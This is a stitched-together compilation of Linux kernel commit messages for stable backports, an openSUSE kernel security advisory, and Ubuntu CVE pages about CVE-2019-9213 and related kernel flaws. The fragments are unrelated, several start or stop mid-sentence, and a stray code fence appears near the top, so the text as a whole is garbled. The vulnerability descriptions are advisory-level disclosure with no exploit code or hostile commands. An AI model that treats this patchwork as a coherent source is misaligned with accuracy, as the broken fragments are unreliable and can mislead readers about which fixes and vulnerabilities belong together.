Broadcom tags inserted by Broadcom switches put a 4 byte header after
the MAC SA and before the EtherType, which may look like some sort of 0
length LLC/SNAP packet (tcpdump and wireshark do think that way). With
ACS enabled in stmmac the packets were truncated to 8 bytes on
reception, whereas clearing this bit allowed normal reception to occur.
In order to make that possible, we need to pass a net\_device argument to
the different core\_init() functions and we are dependent on the Broadcom
tagger padding packets correctly (which it now does). To be as little
invasive as possible, this is only done for gmac1000 when the network
device is DSA-enabled (netdev\_uses\_dsa() returns true).

```
security_mmap_addr() does a capability check with current_cred(), but
we can reach this code from contexts like a VFS write handler where
current_cred() must not be used.

This can be abused on systems without SMAP to make NULL pointer
dereferences exploitable again.

An update that solves 6 vulnerabilities and has 171 fixes
is now available.
Description:
The openSUSE Leap 15.0 was updated to receive various security and
bugfixes.
The following security bugs were fixed:
- CVE-2019-2024: A use-after-free when disconnecting a source was fixed
which could lead to crashes. bnc#1129179).
- CVE-2019-3819: A flaw was found in the Linux kernel in the function
hid\_debug\_events\_read() in drivers/hid/hid-debug.c file which may enter
an infinite loop with certain parameters passed from a userspace. A
local privileged user ("root") can cause a system lock up and a denial
of service. Versions from v4.18 and newer are vulnerable (bnc#1123161).
- CVE-2019-7308: kernel/bpf/verifier.c performed undesirable out-of-bounds
speculation on pointer arithmetic in various cases, including cases of
different branches with different state or limits to sanitize, leading
to side-channel attacks (bnc#1124055).
- CVE-2019-8912: af\_alg\_release() in crypto/af\_alg.c neglected to set a
NULL value for a certain structure member, which leads to a
use-after-free in sockfs\_setattr (bnc#1125907).
- CVE-2019-8980: A memory leak in the kernel\_read\_file function in
fs/exec.c allowed attackers to cause a denial of service (memory
consumption) by triggering vfs\_read failures (bnc#1126209).
- CVE-2019-9213: expand\_downwards in mm/mmap.c lacked a check for the mmap
minimum address, which made it easier for attackers to exploit kernel
NULL pointer dereferences on non-SMAP platforms. This is related to a
capability check for the wrong task (bnc#1128166).
The following non-security bugs were fixed:
- 9p/net: fix memory leak in p9\_client\_create (bsc#1051510).
- 9p: use inode->i\_lock to protect i\_size\_write() under 32-bit
(bsc#1051510).

x86/uaccess: Don't leak the AC flag into \_\_put\_user() value evaluation
commit 2a418cf3f5f1caf911af288e978d61c9844b0695 upstream.
When calling \_\_put\_user(foo(), ptr), the \_\_put\_user() macro would call
foo() in between \_\_uaccess\_begin() and \_\_uaccess\_end(). If that code
were buggy, then those bugs would be run without SMAP protection.
Fortunately, there seem to be few instances of the problem in the
kernel. Nevertheless, \_\_put\_user() should be fixed to avoid doing this.
Therefore, evaluate \_\_put\_user()'s argument before setting AC.
This issue was noticed when an objtool hack by Peter Zijlstra complained
about genregs\_get() and I compared the assembly output to the C source.

MIPS: eBPF: Fix icache flush end address
commit d1a2930d8a992fb6ac2529449f81a0056e1b98d1 upstream.
The MIPS eBPF JIT calls flush\_icache\_range() in order to ensure the
icache observes the code that we just wrote. Unfortunately it gets the
end address calculation wrong due to some bad pointer arithmetic.
The struct jit\_ctx target field is of type pointer to u32, and as such
adding one to it will increment the address being pointed to by 4 bytes.
Therefore in order to find the address of the end of the code we simply
need to add the number of 4 byte instructions emitted, but we mistakenly
add the number of instructions multiplied by 4. This results in the call
to flush\_icache\_range() operating on a memory region 4x larger than
intended, which is always wasteful and can cause crashes if we overrun
into an unmapped page.
Fix this by correcting the pointer arithmetic to remove the bogus
multiplication, and use braces to remove the need for a set of brackets
whilst also making it obvious that the target field is a pointer.

MIPS: fix truncation in \_\_cmpxchg\_small for short values
commit 94ee12b507db8b5876e31c9d6c9d84f556a4b49f upstream.
\_\_cmpxchg\_small erroneously uses u8 for load comparison which can
be either char or short. This patch changes the local variable to
u32 which is sufficiently sized, as the loaded value is already
masked and shifted appropriately. Using an integer size avoids
any unnecessary canonicalization from use of non native widths.
This patch is part of a series that adapts the MIPS small word
atomics code for xchg and cmpxchg on short and char to RISC-V.

hugetlbfs: fix races and page leaks during migration
commit cb6acd01e2e43fd8bad11155752b7699c3d0fb76 upstream.
hugetlb pages should only be migrated if they are 'active'. The
routines set/clear\_page\_huge\_active() modify the active state of hugetlb
pages.
When a new hugetlb page is allocated at fault time, set\_page\_huge\_active
is called before the page is locked. Therefore, another thread could
race and migrate the page while it is being added to page table by the
fault code. This race is somewhat hard to trigger, but can be seen by
strategically adding udelay to simulate worst case scheduling behavior.
Depending on 'how' the code races, various BUG()s could be triggered.
To address this issue, simply delay the set\_page\_huge\_active call until
after the page is successfully added to the page table.
Hugetlb pages can also be leaked at migration time if the pages are
associated with a file in an explicitly mounted hugetlbfs filesystem.
For example, consider a two node system with 4GB worth of huge pages
available. A program mmaps a 2G file in a hugetlbfs filesystem. It
then migrates the pages associated with the file from one node to
another. When the program exits, huge page counts are as follows:
node0
1024 free\_hugepages
1024 nr\_hugepages
node1
0 free\_hugepages
1024 nr\_hugepages
Filesystem Size Used Avail Use% Mounted on
nodev 4.0G 2.0G 2.0G 50% /var/opt/hugepool
That is as expected. 2G of huge pages are taken from the free\_hugepages
counts, and 2G is the size of the file in the explicitly mounted
filesystem. If the file is then removed, the counts become:
node0
1024 free\_hugepages
1024 nr\_hugepages
node1
1024 free\_hugepages
1024 nr\_hugepages
Filesystem Size Used Avail Use% Mounted on
nodev 4.0G 2.0G 2.0G 50% /var/opt/hugepool
Note that the filesystem still shows 2G of pages used, while there
actually are no huge pages in use. The only way to 'fix' the filesystem
accounting is to unmount the filesystem
If a hugetlb page is associated with an explicitly mounted filesystem,
this information in contained in the page\_private field. At migration
time, this information is not preserved. To fix, simply transfer
page\_private from old to new page at migration time if necessary.
There is a related race with removing a huge page from a file and
migration. When a huge page is removed from the pagecache, the
page\_mapping() field is cleared, yet page\_private remains set until the
page is actually freed by free\_huge\_page(). A page could be migrated
while in this state. However, since page\_mapping() is not set the
hugetlbfs specific routine to transfer page\_private is not called and we
leak the page count in the filesystem.
To fix that, check for this condition before migrating a huge page. If
the condition is detected, return EBUSY for the page.

drm: Block fb changes for async plane updates
commit 2216322919c8608a448d7ebc560a845238a5d6b6 upstream.
The prepare\_fb call always happens on new\_plane\_state.
The drm\_atomic\_helper\_cleanup\_planes checks to see if
plane state pointer has changed when deciding to call cleanup\_fb on
either the new\_plane\_state or the old\_plane\_state.
For a non-async atomic commit the state pointer is swapped, so this
helper calls prepare\_fb on the new\_plane\_state and cleanup\_fb on the
old\_plane\_state. This makes sense, since we want to prepare the
framebuffer we are going to use and cleanup the the framebuffer we are
no longer using.
For the async atomic update helpers this differs. The async atomic
update helpers perform in-place updates on the existing state. They call
drm\_atomic\_helper\_cleanup\_planes but the state pointer is not swapped.
This means that prepare\_fb is called on the new\_plane\_state and
cleanup\_fb is called on the new\_plane\_state (not the old).
In the case where old\_plane\_state->fb == new\_plane\_state->fb then
there should be no behavioral difference between an async update
and a non-async commit. But there are issues that arise when
old\_plane\_state->fb != new\_plane\_state->fb.
The first is that the new\_plane\_state->fb is immediately cleaned up
after it has been prepared, so we're using a fb that we shouldn't
be.
The second occurs during a sequence of async atomic updates and
non-async regular atomic commits. Suppose there are two framebuffers
being interleaved in a double-buffering scenario, fb1 and fb2:
- Async update, oldfb = NULL, newfb = fb1, prepare fb1, cleanup fb1
- Async update, oldfb = fb1, newfb = fb2, prepare fb2, cleanup fb2
- Non-async commit, oldfb = fb2, newfb = fb1, prepare fb1, cleanup fb2
We call cleanup\_fb on fb2 twice in this example scenario, and any
further use will result in use-after-free.
The simple fix to this problem is to block framebuffer changes
in the drm\_atomic\_helper\_async\_check function for now.

Free up the allocated memory in the case of error return
The value of mmc\_host->cqe\_enabled stays 'false'. Thus, cqhci\_disable
(mmc\_cqe\_ops->cqe\_disable) won't be called to free the memory. Also,
cqhci\_disable() seems to be designed to disable and free all resources, not

There is not enough space being allocated when DCMD is disabled.
CQE\_DCMD is not necessary to be enabled when CQE is enabled.
(Software could halt CQE to send command)
In the case that CQE\_DCMD is not enabled, it still needs to allocate

mmc: tmio: fix access width of Block Count Register
commit 5603731a15ef9ca317c122cc8c959f1dee1798b4 upstream.
In R-Car Gen2 or later, the maximum number of transfer blocks are
changed from 0xFFFF to 0xFFFFFFFF. Therefore, Block Count Register
should use iowrite32().
If another system (U-boot, Hypervisor OS, etc) uses bit[31:16], this
value will not be cleared. So, SD/MMC card initialization fails.
So, check for the bigger register and use apropriate write. Also, mark
the register as extended on Gen2.

mmc: tmio\_mmc\_core: don't claim spurious interrupts
commit 5c27ff5db1491a947264d6d4e4cbe43ae6535bae upstream.
I have encountered an interrupt storm during the eMMC chip probing (and
the chip finally didn't get detected). It turned out that U-Boot left
the DMAC interrupts enabled while the Linux driver didn't use those.
The SDHI driver's interrupt handler somehow assumes that, even if an
SDIO interrupt didn't happen, it should return IRQ\_HANDLED. I think
that if none of the enabled interrupts happened and got handled, we
should return IRQ\_NONE -- that way the kernel IRQ code recoginizes
a spurious interrupt and masks it off pretty quickly...

mmc: spi: Fix card detection during probe
commit c9bd505dbd9d3dc80c496f88eafe70affdcf1ba6 upstream.
When using the mmc\_spi driver with a card-detect pin, I noticed that the
card was not detected immediately after probe, but only after it was
unplugged and plugged back in (and the CD IRQ fired).
The call tree looks something like this:
mmc\_spi\_probe
mmc\_add\_host
mmc\_start\_host
\_mmc\_detect\_change
mmc\_schedule\_delayed\_work(&host->detect, 0)
mmc\_rescan
host->bus\_ops->detect(host)
mmc\_detect
\_mmc\_detect\_card\_removed
host->ops->get\_cd(host)
mmc\_gpio\_get\_cd -> -ENOSYS (ctx->cd\_gpio not set)
mmc\_gpiod\_request\_cd
ctx->cd\_gpio = desc
To fix this issue, call mmc\_detect\_change after the card-detect GPIO/IRQ
is registered.

KVM: nSVM: clear events pending from svm\_complete\_interrupts() when exiting to L1
[ Upstream commit 619ad846fc3452adaf71ca246c5aa711e2055398 ]
kvm-unit-tests' eventinj "NMI failing on IDT" test results in NMI being
delivered to the host (L1) when it's running nested. The problem seems to
be: svm\_complete\_interrupts() raises 'nmi\_injected' flag but later we
decide to reflect EXIT\_NPF to L1. The flag remains pending and we do NMI
injection upon entry so it got delivered to L1 instead of L2.
It seems that VMX code solves the same issue in prepare\_vmcs12(), this was
introduced with code refactoring in commit 5f3d5799974b ("KVM: nVMX: Rework

mac80211: Add attribute aligned(2) to struct 'action'
[ Upstream commit 7c53eb5d87bc21464da4268c3c0c47457b6d9c9b ]
During refactor in commit 9e478066eae4 ("mac80211: fix MU-MIMO

attribute as:
struct {
struct ieee80211\_hdr\_3addr hdr;
u8 category;
u8 action\_code;
} \_\_packed action;
But since struct 'ieee80211\_hdr\_3addr' is declared with an aligned
keyword as:
struct ieee80211\_hdr {
\_\_le16 frame\_control;
\_\_le16 duration\_id;
u8 addr1[ETH\_ALEN];
u8 addr2[ETH\_ALEN];
u8 addr3[ETH\_ALEN];
\_\_le16 seq\_ctrl;
u8 addr4[ETH\_ALEN];
} \_\_packed \_\_aligned(2);
Solve the ambiguity of placing aligned structure in a packed one by
adding the aligned(2) attribute to struct 'action'.
This removes the following warning (W=1):

drm/msm: Fix A6XX support for opp-level
[ Upstream commit a3c5e2cd79753121f49a8662c1e0a60ddb5486ca ]
The bindings for Qualcomm opp levels changed after being Acked but
before landing. Thus the code in the GPU driver that was relying on
the old bindings is now broken.
Let's change the code to match the new bindings by adjusting the old
string 'qcom,level' to the new string 'opp-level'. See the patch
("dt-bindings: opp: Introduce opp-level bindings").
NOTE: we will do additional cleanup to totally remove the string from
the code and use the new dev\_pm\_opp\_get\_level() but we'll do it in a
future patch. This will facilitate getting the important code fix in
sooner without having to deal with cross-maintainer dependencies.
This patch needs to land before the patch ("arm64: dts: sdm845: Add
gpu and gmu device nodes") since if a tree contains the device tree
patch but not this one you'll get a crash at bootup.

cifs: fix memory leak of an allocated cifs\_ntsd structure
[ Upstream commit 73aaf920cc72024c4a4460cfa46d56e5014172f3 ]
The call to SMB2\_queary\_acl can allocate memory to pntsd and also
return a failure via a call to SMB2\_query\_acl (and then query\_info).
This occurs when query\_info allocates the structure and then in
query\_info the call to smb2\_validate\_and\_copy\_iov fails. Currently the
failure just returns without kfree'ing pntsd hence causing a memory
leak.
Currently, \*data is allocated if it's not already pointing to a buffer,
so it needs to be kfree'd only if was allocated in query\_info, so the
fix adds an allocated flag to track this. Also set \*dlen to zero on
an error just to be safe since \*data is kfree'd.
Also set errno to -ENOMEM if the allocation of \*data fails.

nvme-multipath: drop optimization for static ANA group IDs
[ Upstream commit 78a61cd42a64f3587862b372a79e1d6aaf131fd7 ]
Bit 6 in the ANACAP field is used to indicate that the ANA group ID
doesn't change while the namespace is attached to the controller.
There is an optimisation in the code to only allocate space
for the ANA group header, as the namespace list won't change and
hence would not need to be refreshed.
However, this optimisation was never carried over to the actual
workflow, which always assumes that the buffer is large enough
to hold the ANA header \_and\_ the namespace list.
So drop this optimisation and always allocate enough space.

nvme-rdma: fix timeout handler
[ Upstream commit 4c174e6366746ae8d49f9cc409f728eebb7a9ac9 ]
Currently, we have several problems with the timeout
handler:
1. If we timeout on the controller establishment flow, we will hang
because we don't execute the error recovery (and we shouldn't because
the create\_ctrl flow needs to fail and cleanup on its own)
2. We might also hang if we get a disconnet on a queue while the
controller is already deleting. This racy flow can cause the controller
disable/shutdown admin command to hang.
We cannot complete a timed out request from the timeout handler without
mutual exclusion from the teardown flow (e.g. nvme\_rdma\_error\_recovery\_work).
So we serialize it in the timeout handler and teardown io and admin
queues to guarantee that no one races with us from completing the
request.

writeback: synchronize sync(2) against cgroup writeback membership switches
[ Upstream commit 7fc5854f8c6efae9e7624970ab49a1eac2faefb1 ]
sync\_inodes\_sb() can race against cgwb (cgroup writeback) membership
switches and fail to writeback some inodes. For example, if an inode
switches to another wb while sync\_inodes\_sb() is in progress, the new
wb might not be visible to bdi\_split\_work\_to\_wbs() at all or the inode
might jump from a wb which hasn't issued writebacks yet to one which
already has.
This patch adds backing\_dev\_info->wb\_switch\_rwsem to synchronize cgwb
switch path against sync\_inodes\_sb() so that sync\_inodes\_sb() is
guaranteed to see all the target wbs and inodes can't jump wbs to
escape syncing.

On a DIO\_SKIP\_HOLES filesystem, the ->get\_block() method is currently
not allowed to create blocks for an empty inode. This confusion comes
from trying to bit shift a negative number, so check the size of the
inode first.
The problem is most visible for hfsplus, because the fallback to
buffered I/O doesn't happen and the write fails with EIO. This is in
part the fault of the module, because it gives a wrong return value on
->get\_block(); that will be fixed in a separate patch.

mac80211: fix miscounting of ttl-dropped frames

In ieee80211\_rx\_h\_mesh\_fwding, we increment the 'dropped\_frames\_ttl'
counter when we decrement the ttl to zero. For unicast frames
destined for other hosts, we stop processing the frame at that point.
For multicast frames, we do not rebroadcast it in this case, but we
do pass the frame up the stack to process it on this STA. That
doesn't match the usual definition of "dropped," so don't count
those as such.
With this change, something like `ping6 -i0.2 ff02::1%mesh0` from a
peer in a ttl=1 network no longer increments the counter rapidly.

staging: rtl8723bs: Fix build error with Clang when inlining is disabled
[ Upstream commit 97715058b70da1262fd07798c8b2e3e894f759dd ]
When CONFIG\_NO\_AUTO\_INLINE was present in linux-next (which added
'-fno-inline-functions' to KBUILD\_CFLAGS), an allyesconfig build with
Clang failed at the modpost stage:
ERROR: "is\_broadcast\_mac\_addr" [drivers/staging/rtl8723bs/r8723bs.ko] undefined!
ERROR: "is\_zero\_mac\_addr" [drivers/staging/rtl8723bs/r8723bs.ko] undefined!
ERROR: "is\_multicast\_mac\_addr" [drivers/staging/rtl8723bs/r8723bs.ko] undefined!
These functions were marked as extern inline, meaning that if inlining
doesn't happen, the function will be undefined, as it is above.
This happens to work with GCC because the '-fno-inline-functions' option
respects the \_\_inline attribute so all instances of these functions are
inlined as expected and the definition doesn't actually matter. However,
with Clang and '-fno-inline-functions', a function has to be marked with
the \_\_always\_inline attribute to be considered for inlining, which none
of these functions are. Clang tries to find the symbol definition
elsewhere as it was told and fails, which trickles down to modpost.
To make sure that this code compiles regardless of compiler and make the
intention of the code clearer, use 'static' to ensure these functions
are always defined, regardless of inlining. Additionally, silence a
checkpatch warning by switching from '\_\_inline' to 'inline'.

drivers: thermal: int340x\_thermal: Fix sysfs race condition
[ Upstream commit 129699bb8c7572106b5bbb2407c2daee4727ccad ]
Changes since V1:
\* Use dev\_info instead of printk
\* Use dev\_warn instead of BUG\_ON
Previously, sysfs\_create\_group was called before all initialization had
fully run - specifically, before pci\_set\_drvdata was called. Since the
sysctl group is visible to userspace as soon as sysfs\_create\_group
returns, a small window of time existed during which a process could read
from an uninitialized/partially-initialized device.
This commit moves the creation of the sysctl group to after all
initialized is completed. This ensures that it's impossible for
userspace to read from a sysctl file before initialization has fully
completed.
To catch any future regressions, I've added a check to ensure
that proc\_thermal\_emum\_mode is never PROC\_THERMAL\_NONE when a process
tries to read from a sysctl file. Previously, the aforementioned race
condition could result in the 'else' branch
running while PROC\_THERMAL\_NONE was set,
leading to a null pointer deference.

an ensuing GFP\_KERNEL page allocator call is flagged by lockdep.
We could have switched to GFP\_NOWAIT, but turns out that is not enough
anways and eliding page allocator call leads to less code and
instruction traces to sift thru when debugging pesky crashes.
FWIW, this patch doesn't cure the lockdep splat (which next patch does).

It's GNU Make and linker specific.
The default Makefile rule looks like:
$(CC) $(CFLAGS) $(LDFLAGS) $@ $^ $(LDLIBS)
When linking is done by gcc itself, no issue, but when it needs to be passed
to proper ld, only LDLIBS follows and then ld cannot know what libs to link
with.
More detail:
https://www.gnu.org/software/make/manual/html\_node/Implicit-Variables.html
LDFLAGS
Extra flags to give to compilers when they are supposed to invoke the linker,
‘ld’, such as -L. Libraries (-lfoo) should be added to the LDLIBS variable
instead.
LDLIBS
Library flags or names given to compilers when they are supposed to invoke the
linker, ‘ld’. LOADLIBES is a deprecated (but still supported) alternative to
LDLIBS. Non-library linker flags, such as -L, should go in the LDFLAGS
variable.

tools/perf: libraries must come after objects
Link order matters, use LDLIBS instead of LDFLAGS to properly link against
libpthread.

phy: ath79-usb: Fix the main reset name to match the DT binding
[ Upstream commit 827cb0323928952c0db9515aba9d534fb1285b3f ]
I submitted this driver several times before it got accepted. The
first series hasn't been accepted but the DTS binding did made it.
I then made a second series that added generic reset support to the
PHY core, this in turn required a change to the DT binding. This
second series seemed to have been ignored, so I did a third one
without the change to the PHY core and the DT binding update, and this
last attempt finally made it.
But two months later the DT binding update from the second series has
been integrated too. So now the driver doesn't match the binding and
the only DTS using it. This patch fix the driver to match the new
binding.

ASoC: imx-audmux: change snprintf to scnprintf for possible overflow
[ Upstream commit c407cd008fd039320d147088b52d0fa34ed3ddcb ]
Change snprintf to scnprintf. There are generally two cases where using
snprintf causes problems.
1) Uses of size += snprintf(buf, SIZE - size, fmt, ...)
In this case, if snprintf would have written more characters than what the
buffer size (SIZE) is, then size will end up larger than SIZE. In later
uses of snprintf, SIZE - size will result in a negative number, leading
to problems. Note that size might already be too large by using
size = snprintf before the code reaches a case of size += snprintf.
2) If size is ultimately used as a length parameter for a copy back to user
space, then it will potentially allow for a buffer overflow and information
disclosure when size is greater than SIZE. When the size is used to index
the buffer directly, we can have memory corruption. This also means when
size = snprintf... is used, it may also cause problems since size may become
large. Copying to userspace is mitigated by the HARDENED\_USERCOPY kernel
configuration.
The solution to these issues is to use scnprintf which returns the number of
characters actually written to the buffer, so the size variable will never
exceed SIZE.

x86/mm/mem\_encrypt: Fix erroneous sizeof()
[ Upstream commit bf7d28c53453ea904584960de55e33e03b9d93b1 ]
Using sizeof(pointer) for determining the size of a memset() only works
when the size of the pointer and the size of type to which it points are
the same. For pte\_t this is only true for 64bit and 32bit-NONPAE. On 32bit
PAE systems this is wrong as the pointer size is 4 byte but the PTE entry
is 8 bytes. It's actually not a real world issue as this code depends on
64bit, but it's wrong nevertheless.
Use sizeof(\*p) for correctness sake.

ASoC: core: Make snd\_soc\_find\_component() more robust
[ Upstream commit 5a7b2aabc1aa0393f067d9325ada96fdf67f8cb7 ]
There are some use cases where you're checking for a lot of things on a
card and it makes sense that you might end up trying to call
snd\_soc\_find\_component() without either a name or an of\_node. Currently
in that case we try to dereference the name and crash but it's more
useful to allow the caller to just treat that as a case where we don't
find anything, that error handling will already exist.
Inspired by a patch from Ajit Pandey fixing some callers.

HID: i2c-hid: Disable runtime PM on Goodix touchpad
[ Upstream commit 77ae0d8e401f083ca69c202502da4fc0e38cb1b7 ]
A Goodix touchpad doesn't work. Touching the touchpad can trigger IRQ
but there's no input event from HID subsystem.
Turns out it reports some invalid data:
[ 22.136630] i2c\_hid i2c-DELL091F:00: input: 0b 00 01 00 00 00 00 00 00 00 00
After some trial and error, it's another device that doesn't work well
with ON/SLEEP commands. Disable runtime PM to fix the issue.

usb: gadget: Potential NULL dereference on allocation error
[ Upstream commit df28169e1538e4a8bcd8b779b043e5aa6524545c ]
The source\_sink\_alloc\_func() function is supposed to return error
pointers on error. The function is called from usb\_get\_function() which
doesn't check for NULL returns so it would result in an Oops.
Of course, in the current kernel, small allocations always succeed so
this doesn't affect runtime.

prtd->periods);
In this code prtd->pcm\_size is the buffer\_size and prtd->periods comes
from params->buffer.fragments. If we allow the number of fragments to
be zero then it results in a divide by zero bug. One possible fix would
be to use prtd->pcm\_count directly instead of using the division to
re-calculate it. But I decided that it doesn't really make sense to
allow zero fragments.

scsi: libsas: Fix rphy phy\_identifier for PHYs with end devices attached
commit ffeafdd2bf0b280d67ec1a47ea6287910d271f3f upstream.
The sysfs phy\_identifier attribute for a sas\_end\_device comes from the rphy
phy\_identifier value.
Currently this is not being set for rphys with an end device attached, so
we see incorrect symlinks from systemd disk/by-path:
root@localhost:~# ls -l /dev/disk/by-path/

Indeed, each sas\_end\_device phy\_identifier value is 0:
root@localhost:/# more sys/class/sas\_device/end\_device-0\:0\:2/phy\_identifier
0
root@localhost:/# more sys/class/sas\_device/end\_device-0\:0\:10/phy\_identifier
0
This patch fixes the discovery code to set the phy\_identifier. With this,
we now get proper symlinks:
root@localhost:~# ls -l /dev/disk/by-path/
total 0

genirq/matrix: Improve target CPU selection for managed interrupts.
[ Upstream commit e8da8794a7fd9eef1ec9a07f0d4897c68581c72b ]
On large systems with multiple devices of the same class (e.g. NVMe disks,
using managed interrupts), the kernel can affinitize these interrupts to a
small subset of CPUs instead of spreading them out evenly.
irq\_matrix\_alloc\_managed() tries to select the CPU in the supplied cpumask
of possible target CPUs which has the lowest number of interrupt vectors
allocated.
This is done by searching the CPU with the highest number of available
vectors. While this is correct for non-managed CPUs it can select the wrong
CPU for managed interrupts. Under certain constellations this results in
affinitizing the managed interrupts of several devices to a single CPU in
a set.
The book keeping of available vectors works the following way:
1) Non-managed interrupts:
available is decremented when the interrupt is actually requested by
the device driver and a vector is assigned. It's incremented when the
interrupt and the vector are freed.
2) Managed interrupts:
Managed interrupts guarantee vector reservation when the MSI/MSI-X
functionality of a device is enabled, which is achieved by reserving
vectors in the bitmaps of the possible target CPUs. This reservation
decrements the available count on each possible target CPU.
When the interrupt is requested by the device driver then a vector is
allocated from the reserved region. The operation is reversed when the
interrupt is freed by the device driver. Neither of these operations
affect the available count.
The reservation persist up to the point where the MSI/MSI-X
functionality is disabled and only this operation increments the
available count again.
For non-managed interrupts the available count is the correct selection
criterion because the guaranteed reservations need to be taken into
account. Using the allocated counter could lead to a failing allocation in
the following situation (total vector space of 10 assumed):
CPU0 CPU1
available: 2 0
allocated: 5 3 <--- CPU1 is selected, but available space = 0
managed reserved: 3 7
while available yields the correct result.
For managed interrupts the available count is not the appropriate
selection criterion because as explained above the available count is not
affected by the actual vector allocation.
The following example illustrates that. Total vector space of 10
assumed. The starting point is:
CPU0 CPU1
available: 5 4
allocated: 2 3
managed reserved: 3 3
Allocating vectors for three non-managed interrupts will result in
affinitizing the first two to CPU0 and the third one to CPU1 because the
available count is adjusted with each allocation:
CPU0 CPU1
available: 5 4 <- Select CPU0 for 1st allocation
--> allocated: 3 3
available: 4 4 <- Select CPU0 for 2nd allocation
--> allocated: 4 3
available: 3 4 <- Select CPU1 for 3rd allocation
--> allocated: 4 4
But the allocation of three managed interrupts starting from the same
point will affinitize all of them to CPU0 because the available count is
not affected by the allocation (see above). So the end result is:
CPU0 CPU1
available: 5 4
allocated: 5 3
Introduce a "managed\_allocated" field in struct cpumap to track the vector
allocation for managed interrupts separately. Use this information to
select the target CPU when a vector is allocated for a managed interrupt,
which results in more evenly distributed vector assignments. The above
example results in the following allocations:
CPU0 CPU1
managed\_allocated: 0 0 <- Select CPU0 for 1st allocation
--> allocated: 3 3
managed\_allocated: 1 0 <- Select CPU1 for 2nd allocation
--> allocated: 3 4
managed\_allocated: 1 1 <- Select CPU0 for 3rd allocation
--> allocated: 4 4
The allocation of non-managed interrupts is not affected by this change and
is still evaluating the available count.
The overall distribution of interrupt vectors for both types of interrupts
might still not be perfectly even depending on the number of non-managed
and managed interrupts in a system, but due to the reservation guarantee
for managed interrupts this cannot be avoided.
Expose the new field in debugfs as well.

# CVE-2019-9213

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2019-9211.html) [[Index]](index.html) [[Next]](CVE-2019-9214.html)

### Upstream information

[CVE-2019-9213 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9213)

#### Description

In the Linux kernel before 4.20.14, expand\_downwards in mm/mmap.c lacks a check for the mmap minimum address, which makes it easier for attackers to exploit kernel NULL pointer dereferences on non-SMAP platforms. This is related to a capability check for the wrong task.

## Releases

* [Ubuntu 12.04](/security/notices?release=precise)

## Packages

* [linux-lts-trusty](/security/cves?package=linux-lts-trusty) - Linux hardware enablement kernel from Trusty for Precise ESM

## Details

USN-3933-1 fixed vulnerabilities in the Linux kernel for Ubuntu 14.04

LTS. This update provides the corresponding updates for the Linux

Hardware Enablement (HWE) kernel from Ubuntu 14.04 LTS for Ubuntu

12.04 ESM.

It was discovered that an information leak vulnerability existed in the

Bluetooth implementation of the Linux kernel. An attacker within Bluetooth

range could possibly expose sensitive information (kernel memory).

([CVE-2017-1000410](/security/CVE-2017-1000410))

It was discovered that the USB serial device driver in the Linux kernel did

not properly validate baud rate settings when debugging is enabled. A local

attacker could use this to cause a denial of service (system crash).

([CVE-2017-18360](/security/CVE-2017-18360))

Mathias Payer and Hui Peng discovered a use-after-free vulnerability in the

Advanced Linux Sound Architecture (ALSA) subsystem. A physically proximate

attacker could use this to cause a denial of service (system crash).

([CVE-2018-19824](/security/CVE-2018-19824))

Shlomi Oberman, Yuli Shapiro, and Ran Menscher discovered an information

leak in the Bluetooth implementation of the Linux kernel. An attacker

within Bluetooth range could use this to expose sensitive information

(kernel memory). ([CVE-2019-3459](/security/CVE-2019-3459), [CVE-2019-3460](/security/CVE-2019-3460))

Jann Horn discovered that the KVM implementation in the Linux kernel

contained a use-after-free vulnerability. An attacker in a guest VM with

access to /dev/kvm could use this to cause a denial of service (guest VM

crash). ([CVE-2019-6974](/security/CVE-2019-6974))

Felix Wilhelm discovered that an information leak vulnerability existed in

the KVM subsystem of the Linux kernel, when nested virtualization is used.

A local attacker could use this to expose sensitive information (host

system memory to a guest VM). ([CVE-2019-7222](/security/CVE-2019-7222))

Jann Horn discovered that the mmap implementation in the Linux kernel did

not properly check for the mmap minimum address in some situations. A local

attacker could use this to assist exploiting a kernel NULL pointer

dereference vulnerability. ([CVE-2019-9213](/security/CVE-2019-9213))

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## Details

Mathias Payer and Hui Peng discovered a use-after-free vulnerability in the

Advanced Linux Sound Architecture (ALSA) subsystem. A physically proximate

attacker could use this to cause a denial of service (system crash).

([CVE-2018-19824](/security/CVE-2018-19824))

Shlomi Oberman, Yuli Shapiro, and Ran Menscher discovered an information

leak in the Bluetooth implementation of the Linux kernel. An attacker

within Bluetooth range could use this to expose sensitive information

(kernel memory). ([CVE-2019-3459](/security/CVE-2019-3459), [CVE-2019-3460](/security/CVE-2019-3460))

Jann Horn discovered that the KVM implementation in the Linux kernel

contained a use-after-free vulnerability. An attacker in a guest VM with

access to /dev/kvm could use this to cause a denial of service (guest VM

crash). ([CVE-2019-6974](/security/CVE-2019-6974))

Jim Mattson and Felix Wilhelm discovered a use-after-free vulnerability in

the KVM subsystem of the Linux kernel, when using nested virtual machines.

A local attacker in a guest VM could use this to cause a denial of service

(system crash) or possibly execute arbitrary code in the host system.

([CVE-2019-7221](/security/CVE-2019-7221))

Felix Wilhelm discovered that an information leak vulnerability existed in

the KVM subsystem of the Linux kernel, when nested virtualization is used.

A local attacker could use this to expose sensitive information (host

system memory to a guest VM). ([CVE-2019-7222](/security/CVE-2019-7222))

Jann Horn discovered that the eBPF implementation in the Linux kernel was

insufficiently hardened against Spectre V1 attacks. A local attacker could

use this to expose sensitive information. ([CVE-2019-7308](/security/CVE-2019-7308))

It was discovered that a use-after-free vulnerability existed in the user-

space API for crypto (af\_alg) implementation in the Linux kernel. A local

attacker could use this to cause a denial of service (system crash) or

possibly execute arbitrary code. ([CVE-2019-8912](/security/CVE-2019-8912))

Jakub Jirasek discovered a use-after-free vulnerability in the SCTP

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2019-8956](/security/CVE-2019-8956))

It was discovered that the Linux kernel did not properly deallocate memory

when handling certain errors while reading files. A local attacker could

use this to cause a denial of service (excessive memory consumption).

([CVE-2019-8980](/security/CVE-2019-8980))

It was discovered that a use-after-free vulnerability existed in the IPMI

implementation in the Linux kernel. A local attacker with access to the

IPMI character device files could use this to cause a denial of service

(system crash). ([CVE-2019-9003](/security/CVE-2019-9003))

Jann Horn discovered that the SNMP NAT implementation in the Linux kernel

